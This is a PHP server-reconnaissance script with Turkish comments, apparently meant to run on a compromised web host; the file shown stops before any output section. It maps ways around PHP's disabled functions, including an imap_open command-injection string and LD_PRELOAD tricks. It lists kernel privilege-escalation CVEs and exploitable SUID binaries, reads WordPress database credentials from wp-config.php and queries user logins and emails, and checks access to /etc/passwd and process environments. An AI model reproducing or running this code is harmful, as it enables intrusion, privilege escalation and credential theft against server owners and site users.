<?php
ob_start();
register_shutdown_function(function(){
  $e=error_get_last();
  if($e&&in_array($e['type'],[E_ERROR,E_PARSE,E_CORE_ERROR,E_COMPILE_ERROR])){
    while(ob_get_level()>0)ob_end_clean();
    header('Content-Type:text/html;charset=utf-8');
    echo '<body style="background:#1a1a2e;color:#f55;font-family:monospace;padding:20px"><pre>Fatal: '.htmlspecialchars($e['message']).' (satır '.$e['line'].')</pre></body>';
    exit;
  }
});

// ── Yardımcılar ───────────────────────────────────────────
function _sh($c){
  if(function_exists('shell_exec')){$r=@shell_exec($c.' 2>/dev/null');return trim((string)$r);}
  if(function_exists('exec')){$o=[];@exec($c.' 2>/dev/null',$o);return trim(implode("\n",$o));}
  return'';
}
function _which($b){$r=_sh('which '.escapeshellarg($b));return$r!==''?$r:false;}
function _fmt($b){
  if($b===false||$b===null||$b==='')return'N/A';
  $b=(float)$b;
  if($b>=1073741824)return round($b/1073741824,1).' GB';
  if($b>=1048576)return round($b/1048576,1).' MB';
  if($b>=1024)return round($b/1024,1).' KB';
  return $b.' B';
}
function _e($s){return htmlspecialchars((string)$s,ENT_QUOTES,'UTF-8');}
function _fread($p){$r=@file_get_contents($p);return$r!==false?trim((string)$r):'';}
function _fexists($p){return @file_exists($p);}
// disable_functions'a dahil değilse VE fonksiyon varsa true
function _fn_ok($f){static $df=null;if($df===null){$df=array_flip(array_map('trim',explode(',',ini_get('disable_functions'))));}return!isset($df[$f])&&function_exists($f);}

// ── 1. Sunucu Özeti ───────────────────────────────────────
$server_ip=isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:
  (function_exists('gethostname')?@gethostbyname(@gethostname()):'?');

$client_ip='';
foreach(['HTTP_CF_CONNECTING_IP','HTTP_X_REAL_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $_hk){
  if(!empty($_SERVER[$_hk])){$_parts=explode(',',$_SERVER[$_hk]);$client_ip=trim($_parts[0]);break;}
}

$web_server=isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:'?';
$php_ver=PHP_VERSION;
$php_sapi=php_sapi_name();
$uname_r=php_uname('r');
$uname_full=php_uname();

$cur_user='';
if(_fn_ok('posix_geteuid')&&_fn_ok('posix_getpwuid')){
  $pw=@posix_getpwuid(@posix_geteuid());
  if($pw)$cur_user=$pw['name'].'('.$pw['uid'].')';
}
if(!$cur_user)$cur_user=get_current_user();
if(!$cur_user)$cur_user=_sh('whoami');

// UID/GID
$uid_raw=_fn_ok('posix_geteuid')?@posix_geteuid():null;
$gid_raw=_fn_ok('posix_getegid')?@posix_getegid():null;
$groups_raw='';
if(_fn_ok('posix_getgroups')){$_gids=@posix_getgroups();if($_gids)$groups_raw=implode(',',$_gids);}

$dis_func=ini_get('disable_functions');
if(!trim((string)$dis_func))$dis_func='Yok';
$_dflist=array_filter(array_map('trim',explode(',',$dis_func==='Yok'?'':$dis_func)));

// ── 2. Hosting Ortamı & Sanallaştırma ────────────────────
$env=[];

// Kernel string'den LVE tespiti
$lve_active=preg_match('/\.lve\./i',$uname_r);
$env['LVE (CloudLinux)']=$lve_active?['active','Kernel: '.$uname_r]:['inactive',''];

// CloudLinux release dosyası (open_basedir izin verirse)
$_clr=_fread('/etc/cloudlinux-release');
if(!$_clr)$_clr=_fread('/etc/cl-release');
if(!$_clr&&$lve_active)$_clr='Kernel LVE imzası mevcut (release dosyası okunamadı)';
$env['CloudLinux Release']=$_clr?['active',$_clr]:['inactive',''];

// CageFS tespiti — birden fazla yol
$cagefs=false;$cagefs_reason='';
if(_fexists('/proc/cagefs-skeleton')){$cagefs=true;$cagefs_reason='/proc/cagefs-skeleton mevcut';}
if(!$cagefs&&_fexists('/etc/.cagefs')){$cagefs=true;$cagefs_reason='/etc/.cagefs mevcut';}
$_cg1=_fread('/proc/1/cgroup');if(!$cagefs&&stripos($_cg1,'cagefs')!==false){$cagefs=true;$cagefs_reason='cgroup: cagefs';}
// /proc/self/environ okunamazsa muhtemelen CageFS
$_pse=_fread('/proc/self/environ');
$proc_self_environ=$_pse!==''?true:false;
if(!$cagefs&&!$proc_self_environ&&$lve_active){$cagefs_reason='Muhtemel (proc/self/environ okunamadı + LVE aktif)';}
$env['CageFS']=$cagefs?['active',$cagefs_reason]:['inactive',$cagefs_reason?:'Tespit edilemedi'];

// Container/VPS tespiti
$virt_type='Bilinmiyor';
$_cg=_fread('/proc/1/cgroup');
$_cpuinfo=_fread('/proc/cpuinfo');
if($_cg!==''){
  if(stripos($_cg,'docker')!==false)$virt_type='Docker';
  elseif(stripos($_cg,'lxc')!==false)$virt_type='LXC';
  elseif(stripos($_cg,'kubepods')!==false)$virt_type='Kubernetes';
}
if($virt_type==='Bilinmiyor'){
  if(_fexists('/proc/vz/veinfo'))$virt_type='OpenVZ';
  elseif(_fexists('/proc/user_beancounters'))$virt_type='OpenVZ';
  elseif($_cpuinfo&&stripos($_cpuinfo,'hypervisor')!==false)$virt_type='VM (KVM/VMware/Xen)';
  elseif($lve_active)$virt_type='CloudLinux LVE (paylaşımlı)';
  elseif(_fexists('/proc/xen'))$virt_type='Xen';
}
$env['Sanallaştırma']=['info',$virt_type];

// LXC namespace
$_ns=_fread('/proc/self/cgroup');
$_in_container=($_ns&&(stripos($_ns,'docker')!==false||stripos($_ns,'lxc')!==false))?true:false;

// proc/self erişim haritası
$proc_self_cmdline=_fread('/proc/self/cmdline')!=='';
$proc_self_status=_fread('/proc/self/status')!=='';
$proc_version=_fread('/proc/version')!=='';
$proc_1_cmdline=_fread('/proc/1/cmdline')!=='';

// SELinux
$_se_mode='';
$_se_cfg=_fread('/etc/selinux/config');
if(preg_match('/^SELINUX=(\w+)/m',(string)$_se_cfg,$_sm))$_se_mode=$_sm[1];
$_ge=_sh('getenforce');if($_ge)$_se_mode=$_ge;
$_seactive=($_se_mode&&strtolower($_se_mode)!=='disabled');
$env['SELinux']=$_seactive?['active',$_se_mode]:['inactive',$_se_mode?:'Kapalı'];

// AppArmor
$_aa=_fexists('/sys/kernel/security/apparmor/profiles');
$env['AppArmor']=$_aa?['active','Aktif']:['inactive',''];

// Suhosin
$env['Suhosin']=extension_loaded('suhosin')?['active','Yüklü']:['inactive',''];

// Imunify360
$i360=extension_loaded('i360')||_fexists('/var/imunify360');
$env['Imunify360']=$i360?['active','Aktif']:['inactive',''];

// mod_security
$_ms=false;
if(function_exists('apache_get_modules')){foreach(apache_get_modules() as $_m){if(stripos($_m,'security')!==false){$_ms=true;break;}}}
$env['mod_security']=$_ms?['active','Aktif']:['inactive',''];

// LiteSpeed
$_ls=stripos($web_server,'litespeed')!==false||$php_sapi==='litespeed';
$env['LiteSpeed']=$_ls?['warn','Aktif']:['inactive',''];

// Uptime/Load
$_la=_fread('/proc/loadavg');
$load_avg='';if($_la){$_lp=explode(' ',$_la);$load_avg=$_lp[0].'/'.(isset($_lp[1])?$_lp[1]:'?').'/'.(isset($_lp[2])?$_lp[2]:'?');}

// ── 3. Kontrol Paneli Tespiti ─────────────────────────────
// Hem dosya sistemi hem path/env bazlı tespit
$sd_path=isset($_SERVER['SCRIPT_FILENAME'])?$_SERVER['SCRIPT_FILENAME']:__FILE__;
$doc_root_path=isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'';

// Path-based panel tespiti (open_basedir bağımsız)
function _detect_panel_by_path($path){
  // DirectAdmin: /home/USER/domains/DOMAIN/
  if(preg_match('#/home/[^/]+/domains/#',$path))return'DirectAdmin';
  // cPanel: /home/USER/public_html/
  if(preg_match('#/home/[^/]+/public_html/#',$path))return'cPanel';
  // Plesk: /var/www/vhosts/DOMAIN/
  if(preg_match('#/var/www/vhosts/#',$path))return'Plesk';
  // HestiaCP: /home/USER/web/DOMAIN/
  if(preg_match('#/home/[^/]+/web/#',$path))return'HestiaCP';
  // ISPConfig: /var/www/clients/
  if(preg_match('#/var/www/clients/#',$path))return'ISPConfig';
  // VestaCP: /home/USER/web/DOMAIN/public_html
  if(preg_match('#/home/[^/]+/web/[^/]+/public_html#',$path))return'VestaCP/HestiaCP';
  // CyberPanel: /home/DOMAIN/public_html
  if(preg_match('#/home/[^/\.]+\.[^/]+/public_html#',$path))return'CyberPanel';
  return'';
}

$panel_by_path=_detect_panel_by_path($sd_path)?:_detect_panel_by_path($doc_root_path);

// Env değişkenlerinden
$panel_by_env='';
foreach(['PANEL','SERVER_PANEL','HOSTING_PANEL','DA_VERSION','CPANEL_BUILD'] as $_pe){
  if(!empty($_SERVER[$_pe])){$panel_by_env=$_SERVER[$_pe];break;}
}

// Dosya sistemi bazlı (open_basedir izin verirse)
$panel_map=[
  'cPanel'      =>[['/usr/local/cpanel',''],'/usr/local/cpanel/version'],
  'Plesk'       =>[['/usr/local/psa','/opt/psa'],'/usr/local/psa/version'],
  'DirectAdmin' =>[['/usr/local/directadmin'],'/usr/local/directadmin/scripts/version.txt'],
  'ISPConfig'   =>[['/usr/local/ispconfig'],''],
  'HestiaCP'    =>[['/usr/local/hestia'],'/usr/local/hestia/conf/hestia.conf'],
  'CyberPanel'  =>[['/usr/local/CyberCP'],''],
  'Virtualmin'  =>[['/etc/webmin/virtualmin.acl'],''],
  'Webmin'      =>[['/etc/webmin'],'/etc/webmin/version'],
];
$panels=[];
foreach($panel_map as $_pn=>$_pd){
  $_paths=$_pd[0];$_vfile=$_pd[1];
  foreach($_paths as $_pp){
    if(_fexists($_pp)){$panels[$_pn]=$_vfile?trim(_fread($_vfile)):'Tespit edildi';break;}
  }
}
if($panel_by_path&&!isset($panels[$panel_by_path]))$panels[$panel_by_path]='Path yapısından tespit';

// ── 4. Kernel Güvenlik Parametreleri & SUID ───────────────
$ksec=[];
$_uns=_fread('/proc/sys/kernel/unprivileged_userns_clone');
$ksec['user_ns (userns_clone)']=trim($_uns)!==''?trim($_uns):'N/A';
$_ptrace=_fread('/proc/sys/kernel/yama/ptrace_scope');
$ksec['ptrace_scope']=trim($_ptrace)!==''?trim($_ptrace):'N/A';
$_dmesg_r=_fread('/proc/sys/kernel/dmesg_restrict');
$ksec['dmesg_restrict']=trim($_dmesg_r)!==''?trim($_dmesg_r):'N/A';
$_perf=_fread('/proc/sys/kernel/perf_event_paranoid');
$ksec['perf_paranoid']=trim($_perf)!==''?trim($_perf):'N/A';
$_nul=_fread('/proc/sys/vm/mmap_min_addr');
$ksec['mmap_min_addr']=trim($_nul)!==''?trim($_nul):'N/A';

// Kernel CVE özeti (versiyon bazlı, hardcoded)
$kernel_cves=[];
preg_match('/(\d+)\.(\d+)\.(\d+)/i',$uname_r,$_kv);
if(!empty($_kv)){
  $_ma=(int)$_kv[1];$_mi=(int)$_kv[2];$_kp=(int)$_kv[3];
  $cve_list=[
    ['DirtyPipe CVE-2022-0847','5.8-5.16.10',($_ma===5&&$_mi>=8&&($_mi<16||($_mi===16&&$_kp<=10))),'pipe splice, SUID overwrite — çok güçlü'],
    ['GameOverlay CVE-2023-2640','5.15+ Ubuntu',($_ma>=5&&$_mi>=15),'Ubuntu overlayfs — user_ns gerekli'],
    ['OverlayFS CVE-2021-3493','<5.11 Ubuntu',($_ma<5||($_ma===5&&$_mi<11)),'overlayfs + user_ns (Ubuntu)'],
    ['PwnKit CVE-2021-4034','hepsi',true,'pkexec SUID varsa — universal'],
    ['Looney Tunables CVE-2023-4911','hepsi glibc',true,'GLIBC_TUNABLES — Debian/RHEL/Fedora glibc <2.34-r8'],
    ['DirtyCredentials CVE-2023-3269','6.0-6.3',($_ma===6&&$_mi<=3),'mm/memory mgmt UAF'],
    ['StackRot CVE-2023-3269','6.1-6.4',($_ma===6&&$_mi>=1&&$_mi<=4),'maple tree UAF'],
    ['PTRACE_SEIZE CVE-2023-0386','<6.2',($_ma<6||($_ma===6&&$_mi<2)),'overlayfs setuid'],
  ];
  foreach($cve_list as $_c){if($_c[2])$kernel_cves[]=['name'=>$_c[0],'range'=>$_c[1],'desc'=>$_c[3]];}
}

// Bilinen SUID binary tespiti
$suid_known=[
  '/usr/bin/newuidmap'=>'newuidmap (user_ns escape)',
  '/usr/bin/newgidmap'=>'newgidmap (user_ns escape)',
  '/usr/bin/pkexec'   =>'pkexec (CVE-2021-4034)',
  '/usr/bin/sudo'     =>'sudo',
  '/usr/bin/passwd'   =>'passwd',
  '/usr/bin/mount'    =>'mount',
  '/usr/bin/umount'   =>'umount',
  '/usr/bin/su'       =>'su',
  '/usr/bin/screen'   =>'screen (CVE-2017-5618)',
  '/usr/bin/nmap'     =>'nmap (--interactive)',
  '/usr/bin/perl'     =>'perl (GTFOBins)',
  '/usr/bin/python3'  =>'python3 (GTFOBins)',
  '/usr/bin/python'   =>'python (GTFOBins)',
  '/usr/bin/find'     =>'find (GTFOBins)',
  '/usr/bin/vim'      =>'vim (GTFOBins)',
  '/usr/bin/awk'      =>'awk (GTFOBins)',
  '/usr/sbin/pppd'    =>'pppd (buffer overflow)',
  '/bin/bash'         =>'bash',
  '/usr/bin/hole'     =>'hole (custom backdoor?)',
];
$suid_found=[];
foreach($suid_known as $_sp=>$_sn){
  if(_fexists($_sp)){
    $_pm=@fileperms($_sp);
    $_is_suid=$_pm&&($_pm&0x0800);
    $_is_sgid=$_pm&&($_pm&0x0400);
    $suid_found[$_sp]=['name'=>$_sn,'suid'=>$_is_suid,'sgid'=>$_is_sgid,'perms'=>$_pm?substr(sprintf('%o',$_pm),-4):'?'];
  }
}

// ── 5. Exec Bypass Analizi ────────────────────────────────
// Status: 'yes'=çalışır, 'no'=çalışmaz, 'partial'=kısıtlı/koşullu
$bypass=[];

// Language constructs — ALWAYS WORK (disable_functions etkisiz)
$bypass['eval()']=['yes','Language construct — disable_functions ETKİSİZ, her zaman çalışır'];
$bypass['assert()']=['yes','Language construct (PHP8\'de fonksiyon ama hâlâ override edilemez)'];
$bypass['include/require']=['yes','Language construct — remote include için allow_url_include gerekli'];

// create_function / preg_replace /e
$_php_major=(int)PHP_MAJOR_VERSION;
$bypass['create_function()']=$_php_major<8?['yes','PHP 7 altı: arka planda eval() çalıştırır']:['no','PHP 8\'de kaldırıldı'];
$bypass['preg_replace /e']=$_php_major<7?['yes','PHP 7 altında: /e modifier eval() çalıştırır']:['no','PHP 7\'de kaldırıldı'];

// Temel exec fonksiyonları
$exec_fns=['exec'=>'shell exec','shell_exec'=>'shell exec','system'=>'shell exec + echo',
  'passthru'=>'shell exec + raw output','popen'=>'pipe open','proc_open'=>'process open'];
foreach($exec_fns as $_f=>$_fd){
  $_ok=_fn_ok($_f);
  $bypass[$_f]=$_ok?['yes',$_fd]:['no','disable_functions\'da'];
}

// pcntl_exec
$_pcntl=_fn_ok('pcntl_exec');
$bypass['pcntl_exec']=$_pcntl?['partial','Mevcut ama output yok — process replace, HTTP 503 verir']:['no','Yok veya disabled'];

// FFI
$ffi_enabled=false;$ffi_status='';
if(extension_loaded('FFI')){
  $ffi_ini=ini_get('ffi.enable');
  if($ffi_ini==='true'||$ffi_ini==='1'||$ffi_ini==='preload'){$ffi_enabled=true;$ffi_status='ffi.enable='.$ffi_ini.' ✓';}
  else{$ffi_status='ffi.enable='.($ffi_ini?:'"" (kapalı)');}
}else{$ffi_status='Uzantı yüklü değil';}
$bypass['FFI::cdef']=$ffi_enabled?['yes','FFI ile libc popen/system çağrılabilir: '.$ffi_status]:['no',$ffi_status];

// LD_PRELOAD — gerçek test
$putenv_ok=_fn_ok('putenv');
$mail_ok=_fn_ok('mail');
$errlog_ok=_fn_ok('error_log');
$mbmail_ok=_fn_ok('mb_send_mail');
// sendmail binary gerçekten var mı?
$_sm_path=ini_get('sendmail_path');
$_sm_bin=trim(explode(' ',$_sm_path)[0]);
$_sm_exists=($_sm_bin&&_fexists($_sm_bin));
$_ldp_base=$putenv_ok?'putenv ✓':'putenv ✗ (disabled)';
$bypass['LD_PRELOAD+mail']=($putenv_ok&&$mail_ok&&$_sm_exists)?
  ['yes',$_ldp_base.' | mail ✓ | sendmail='.$_sm_bin.' ✓ — .so yükle+putenv+mail()']:
  ['no',$_ldp_base.' | mail='.($mail_ok?'✓':'✗ disabled').' | sendmail='.($_sm_exists?$_sm_bin.' ✓':'bulunamadı')];
$bypass['LD_PRELOAD+error_log']=($putenv_ok&&$errlog_ok)?
  ['yes',$_ldp_base.' | error_log ✓']:['no',$_ldp_base.' | error_log='.($errlog_ok?'✓':'✗ disabled')];
$bypass['LD_PRELOAD+mb_send_mail']=($putenv_ok&&$mbmail_ok)?
  ['yes',$_ldp_base.' | mb_send_mail ✓']:['no',$_ldp_base.' | mb_send_mail='.($mbmail_ok?'✓':'✗ disabled')];

// dl() — runtime .so yükleme
$dl_ok=_fn_ok('dl')&&ini_get('enable_dl');
$bypass['dl()']=$dl_ok?['yes','dl() aktif — runtime shared lib yükleme mümkün']:
  ['no','dl() '.(!function_exists('dl')?'yok':(!ini_get('enable_dl')?'enable_dl=off':'disabled'))];

// imap_open() bypass
$imap_ok=_fn_ok('imap_open');
$bypass['imap_open']=$imap_ok?['yes','Command injection: imap_open("{localhost:143/imap}x -oProxyCommand=cmd","","")']:
  ['no','imap_open '.(extension_loaded('imap')?'disable_functions\'da':'yüklü değil')];

// Imagick
$bypass['Imagick policy']=class_exists('Imagick')?['partial','Imagick mevcut — ImageMagick policy.xml\'e bağlı']:['no','Imagick yüklü değil'];

// expect:// wrapper
$expect_ok=in_array('expect',stream_get_wrappers());
$bypass['expect://']=$expect_ok?['yes','expect:// AKTİF — fopen/include ile komut çalıştırır']:['no','Yok'];

// Symlink
$bypass['Symlink race']=[!$cagefs?'yes':'no','CageFS '.($cagefs?'AKTİF (bloke)':'YOK — /proc/sysrq, cron race mümkün')];

// ZIP wrapper
$bypass['zip:// wrapper']=extension_loaded('zip')?['partial','zip:// aktif — LFI zinciri için']:['no','zip ext yok'];

// glob:// wrapper
$bypass['glob://']=['partial','glob:// her zaman aktif — directory listing (LFI yardımcı)'];

// ── 5. Servisler ──────────────────────────────────────────
$svc_list=['MySQL','cURL','WGET','Perl','Python','Ruby','Git','WP-CLI','Sudo','Pkexec','FFmpeg','Composer','Node.js','NPM','Zip','Tar','Unzip','7zip','Sendmail'];
$svc=[];
foreach($svc_list as $_s){
  switch($_s){
    case 'MySQL':   $svc[$_s]=extension_loaded('mysqli')||extension_loaded('pdo_mysql')||extension_loaded('mysql');break;
    case 'cURL':    $svc[$_s]=function_exists('curl_version');break;
    case 'WGET':    $svc[$_s]=(bool)_which('wget');break;
    case 'Perl':    $svc[$_s]=(_which('perl')||false)?true:false;break;
    case 'Python':  $svc[$_s]=(_which('python3')||_which('python'))?true:false;break;
    case 'Ruby':    $svc[$_s]=(bool)_which('ruby');break;
    case 'Git':     $svc[$_s]=(bool)_which('git');break;
    case 'WP-CLI':  $svc[$_s]=(bool)_which('wp');break;
    case 'Sudo':    $svc[$_s]=(bool)_which('sudo');break;
    case 'Pkexec':  $svc[$_s]=(bool)_which('pkexec');break;
    case 'FFmpeg':  $svc[$_s]=(bool)_which('ffmpeg');break;
    case 'Composer':$svc[$_s]=(bool)_which('composer');break;
    case 'Node.js': $svc[$_s]=(bool)_which('node');break;
    case 'NPM':     $svc[$_s]=(bool)_which('npm');break;
    case 'Zip':     $svc[$_s]=extension_loaded('zip')||(bool)_which('zip');break;
    case 'Tar':     $svc[$_s]=(bool)_which('tar');break;
    case 'Unzip':   $svc[$_s]=(bool)_which('unzip');break;
    case '7zip':    $svc[$_s]=(bool)(_which('7z')||_which('7za'));break;
    case 'Sendmail':$svc[$_s]=(bool)_which('sendmail');break;
    default:        $svc[$_s]=false;
  }
}

$svc_ver=[];
if($svc['cURL']&&function_exists('curl_version')){$cv=curl_version();$svc_ver['cURL']=isset($cv['version'])?$cv['version']:'';}
if($svc['Python']){$py=_sh('python3 --version')?:_sh('python --version');$svc_ver['Python']=trim(str_ireplace('Python','',$py));}
if($svc['Perl'])$svc_ver['Perl']=_sh('perl -e "print $]"');
if($svc['Git'])$svc_ver['Git']=trim(str_replace('git version','',_sh('git --version')));
if($svc['Node.js'])$svc_ver['Node.js']=ltrim(_sh('node --version'),'v');

// ── 6. WordPress Tespiti ──────────────────────────────────
$wp_info=[];
$_wp_cfg_paths=[
  $doc_root_path.'/wp-config.php',
  dirname($sd_path).'/wp-config.php',
  dirname(dirname($sd_path)).'/wp-config.php',
  dirname(dirname(dirname($sd_path))).'/wp-config.php',
];
$_wp_cfg='';
foreach($_wp_cfg_paths as $_p){
  $_c=_fread($_p);
  if($_c&&strpos($_c,'DB_NAME')!==false){$_wp_cfg=$_c;$wp_info['config_path']=$_p;break;}
}
if($_wp_cfg){
  if(preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'/i",$_wp_cfg,$_m))$wp_info['DB_NAME']=$_m[1];
  if(preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'/i",$_wp_cfg,$_m))$wp_info['DB_USER']=$_m[1];
  if(preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'/i",$_wp_cfg,$_m))$wp_info['DB_PASS']=$_m[1];
  if(preg_match("/define\(\s*'DB_HOST'\s*,\s*'([^']+)'/i",$_wp_cfg,$_m))$wp_info['DB_HOST']=$_m[1];
  if(preg_match('/\$table_prefix\s*=\s*\'([^\']+)\'/i',$_wp_cfg,$_m))$wp_info['PREFIX']=$_m[1];
  if(preg_match("/define\(\s*'AUTH_KEY'\s*,\s*'([^']{8})/i",$_wp_cfg,$_m))$wp_info['AUTH_KEY']=$_m[1].'...';
  // WP admin kullanıcıları (MySQL erişimi varsa)
  if(isset($wp_info['DB_NAME'])&&extension_loaded('mysqli')){
    try{
      $_myi=@mysqli_connect(
        $wp_info['DB_HOST']??'localhost',
        $wp_info['DB_USER']??'',
        $wp_info['DB_PASS']??'',
        $wp_info['DB_NAME']??''
      );
      if($_myi){
        $pfx=$wp_info['PREFIX']??'wp_';
        $_r=@mysqli_query($_myi,"SELECT user_login,user_pass,user_email,user_registered FROM {$pfx}users ORDER BY ID LIMIT 10");
        if($_r){$_wu=[];while($_row=mysqli_fetch_assoc($_r))$_wu[]=$_row['user_login'].' <'.$_row['user_email'].'> ['.$_row['user_registered'].']';$wp_info['Users']=implode(', ',$_wu);}
        $_ro=@mysqli_query($_myi,"SELECT option_value FROM {$pfx}options WHERE option_name='siteurl' LIMIT 1");
        if($_ro&&$_ro2=mysqli_fetch_assoc($_ro))$wp_info['Site URL']=$_ro2['option_value'];
        @mysqli_close($_myi);
      }
    }catch(Exception $_ex){}
  }
}

// ── 7. PHP Limitleri ──────────────────────────────────────
$limits=[
  'memory_limit'        =>ini_get('memory_limit'),
  'max_execution_time'  =>ini_get('max_execution_time').' sn',
  'upload_max_filesize' =>ini_get('upload_max_filesize'),
  'post_max_size'       =>ini_get('post_max_size'),
  'max_input_vars'      =>ini_get('max_input_vars'),
  'max_file_uploads'    =>ini_get('max_file_uploads'),
  'allow_url_fopen'     =>ini_get('allow_url_fopen')?'Açık ⚠':'Kapalı',
  'allow_url_include'   =>ini_get('allow_url_include')?'Açık ⚠':'Kapalı',
  'display_errors'      =>ini_get('display_errors')?'Açık':'Kapalı',
  'error_reporting'     =>ini_get('error_reporting'),
  'ffi.enable'          =>ini_get('ffi.enable')?:'(boş/kapalı)',
  'session.save_path'   =>ini_get('session.save_path')?:sys_get_temp_dir(),
  'upload_tmp_dir'      =>ini_get('upload_tmp_dir')?:sys_get_temp_dir(),
  'date.timezone'       =>ini_get('date.timezone')?:date_default_timezone_get(),
  'default_charset'     =>ini_get('default_charset'),
  'max_input_time'      =>ini_get('max_input_time').' sn',
  'sendmail_path'       =>ini_get('sendmail_path')?:'N/A',
];

// ── 8. PHP Eklentileri ────────────────────────────────────
$all_exts=get_loaded_extensions();
sort($all_exts);
$hl_exts=['gd','imagick','mbstring','openssl','zip','intl','curl','pdo','mysqli',
  'redis','memcached','memcache','opcache','apcu','soap','xdebug','iconv','json',
  'xml','simplexml','xmlrpc','pcre','hash','bcmath','exif','fileinfo','ftp',
  'imap','ldap','pdo_mysql','pdo_sqlite','pdo_pgsql','pgsql','sodium','sockets',
  'calendar','gettext','gmp','mcrypt','ssh2','yaml','mongo','mongodb','ffi','pcntl',
  'readline','sysvshm','sysvsem'];

// ── 9. Cache ──────────────────────────────────────────────
$cache=[];
if(function_exists('opcache_get_status')){
  $ops=@opcache_get_status(false);
  if($ops&&!empty($ops['opcache_enabled'])&&$ops['opcache_enabled']){
    $hits=isset($ops['opcache_statistics']['hits'])?(int)$ops['opcache_statistics']['hits']:0;
    $miss=isset($ops['opcache_statistics']['misses'])?(int)$ops['opcache_statistics']['misses']:0;
    $tot=$hits+$miss;$hr=$tot>0?round($hits/$tot*100,1):0;
    $mu=isset($ops['memory_usage']['used_memory'])?round($ops['memory_usage']['used_memory']/1048576,1):0;
    $mf=isset($ops['memory_usage']['free_memory'])?round($ops['memory_usage']['free_memory']/1048576,1):0;
    $cache['OPcache']='Aktif | Hit: '.$hr.'% | Bellek: '.$mu.' / '.($mu+$mf).' MB';
  }else{$cache['OPcache']=false;}
}else{$cache['OPcache']=null;}

if(function_exists('apcu_sma_info')){
  $ai=@apcu_sma_info();$cache['APCu']=$ai?'Aktif | Boş: '.round($ai['avail_mem']/1048576,1).' MB':false;
}else{$cache['APCu']=null;}

if(class_exists('Memcache')){
  try{$mc=new Memcache();$mcok=@$mc->connect('127.0.0.1',11211);if($mcok){@$mc->close();$cache['Memcache']='Aktif';}else $cache['Memcache']=false;}
  catch(Exception $e){$cache['Memcache']=false;}
}else{$cache['Memcache']=null;}

if(class_exists('Memcached')){
  try{$mcd=new Memcached();$mcd->addServer('127.0.0.1',11211);$mst=@$mcd->getStats();$cache['Memcached']=$mst&&!empty($mst)?'Aktif':'Yüklü (bağlantı yok)';}
  catch(Exception $e){$cache['Memcached']=false;}
}else{$cache['Memcached']=null;}

if(class_exists('Redis')){
  try{
    $rd=new Redis();$rco=@$rd->connect('127.0.0.1',6379,2);
    if($rco){$ri=@$rd->info('server');$rv=is_array($ri)&&isset($ri['redis_version'])?$ri['redis_version']:'';@$rd->close();$cache['Redis']='Aktif'.($rv?' v'.$rv:'');}
    else{$cache['Redis']=false;}
  }catch(Exception $e){$cache['Redis']=false;}
}else{$cache['Redis']=null;}

if(function_exists('xcache_info'))$cache['XCache']='Aktif';
else $cache['XCache']=null;

// ── 10. Veritabanı ────────────────────────────────────────
$db=[];
if(extension_loaded('mysqli'))$db['MySQL']='Yüklü | mysqlnd '.PHP_VERSION;
elseif(extension_loaded('pdo_mysql'))$db['MySQL']='PDO MySQL';
elseif(extension_loaded('mysql'))$db['MySQL']='mysql ext (deprecated)';
else $db['MySQL']=false;
if(extension_loaded('pgsql'))$db['PostgreSQL']='Yüklü';
elseif(extension_loaded('pdo_pgsql'))$db['PostgreSQL']='PDO PostgreSQL';
else $db['PostgreSQL']=false;
if(extension_loaded('sqlite3')){$sv3=SQLite3::version();$db['SQLite']='v'.(isset($sv3['versionString'])?$sv3['versionString']:'?');}
elseif(extension_loaded('pdo_sqlite'))$db['SQLite']='PDO SQLite';
else $db['SQLite']=false;
$db['MongoDB']=extension_loaded('mongodb')?'Yüklü':(extension_loaded('mongo')?'mongo ext (eski)':false);
$db['MSSQL']=(extension_loaded('pdo_sqlsrv')||extension_loaded('sqlsrv'))?'Yüklü':false;

// ── 11. Dosya Sistemi ─────────────────────────────────────
$docroot=rtrim(isset($_SERVER['DOCUMENT_ROOT'])?$_SERVER['DOCUMENT_ROOT']:'','/\\');
$fs=[];
$fs['DOCUMENT_ROOT']=$docroot?:__DIR__;
$dtot=$docroot?@disk_total_space($docroot):false;
$dfre=$docroot?@disk_free_space($docroot):false;
$fs['Disk Toplam']=_fmt($dtot);
$fs['Disk Boş']=_fmt($dfre);
if($dtot&&$dfre&&$dtot>0)$fs['Disk Kullanım %']=round(($dtot-$dfre)/$dtot*100,1).'%';
$tmp=sys_get_temp_dir();
$_tmp_exec=false;
// /tmp çalıştırılabilir mi?
if(is_writable($tmp)){
  $_te=tempnam($tmp,'_te');
  if($_te){file_put_contents($_te,'#!/bin/sh');@chmod($_te,0755);$_tmp_exec=is_executable($_te);@unlink($_te);}
}
$fs['Tmp Dizin']=$tmp.' — '.(is_writable($tmp)?'Yazılabilir':'Salt Okunur').($_tmp_exec?' [ÇALIŞTIRILABILIR]':'');
$sp=ini_get('session.save_path')?:$tmp;
$fs['Session Dizin']=$sp.' — '.($sp&&is_writable($sp)?'Yazılabilir':'Salt Okunur');
$ut=ini_get('upload_tmp_dir')?:$tmp;
$fs['Upload Tmp']=$ut.' — '.($ut&&is_writable($ut)?'Yazılabilir':'Salt Okunur');
$sd=isset($_SERVER['SCRIPT_FILENAME'])?dirname($_SERVER['SCRIPT_FILENAME']):__DIR__;
$fs['Script Dizin']=$sd.' — '.(is_writable($sd)?'Yazılabilir':'Salt Okunur');
// Home dizin
$home_dir=isset($_SERVER['HOME'])?$_SERVER['HOME']:(_fn_ok('posix_geteuid')&&_fn_ok('posix_getpwuid')?(@posix_getpwuid(@posix_geteuid())['dir']??''):'');
if($home_dir)$fs['Home']=$home_dir.' — '.(@is_writable($home_dir)?'Yazılabilir':'Salt Okunur');
// /etc/passwd okunabilir mi
$etc_passwd=_fread('/etc/passwd');
$fs['/etc/passwd']=$etc_passwd?'Okunabilir ('.substr_count($etc_passwd,"\n").' satır)':'Okunamadı (open_basedir veya izin)';
// /proc erişim
$fs['proc/self/environ']=$proc_self_environ?'Okunabilir ⚠':'Okunamadı';
$fs['proc/self/cmdline']=$proc_self_cmdline?'Okunabilir':'Okunamadı';
$fs['proc/self/status']=$proc_self_status?'Okunabilir':'Okunamadı';
$fs['proc/version']=$proc_version?'Okunabilir':'Okunamadı';
